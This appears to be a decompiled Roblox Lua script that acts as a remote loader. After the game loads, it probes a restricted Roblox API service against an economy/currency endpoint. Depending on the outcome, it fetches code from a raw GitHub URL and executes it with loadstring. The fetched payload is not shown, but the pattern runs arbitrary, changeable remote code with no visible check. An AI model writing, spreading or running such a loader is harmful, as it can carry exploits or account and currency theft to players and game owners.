repeat
    task.wait()
    v3 = game
until v3.IsLoaded(v3)
local function v1()
    local loadstring_ = loadstring
    local game_ = game
    loadstring_(game_.HttpGet(game_, "https://raw.githubusercontent.com/123coconut123/Variables/main/prideone"))()
    wait(100000000000)
end
if select(2, pcall(function()
    local game_ = game
    game_ = game_.GetService(game_, "HttpRbxApiService")
    game_.GetAsyncFullUrl(game_, "https://economy.roblox.com/v1/user/currency")
end)) then
    v1()
else
    print("continue")
end
if not task.wait(0.25) then
    return
end
